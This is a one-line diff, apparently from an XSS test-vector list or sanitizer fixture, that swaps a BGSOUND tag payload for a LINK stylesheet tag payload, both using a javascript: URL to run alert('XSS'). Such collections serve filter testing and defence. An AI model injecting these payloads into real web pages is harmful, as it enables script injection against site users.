@@ -1,1 +1,1 @@
-<BGSOUND SRC="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
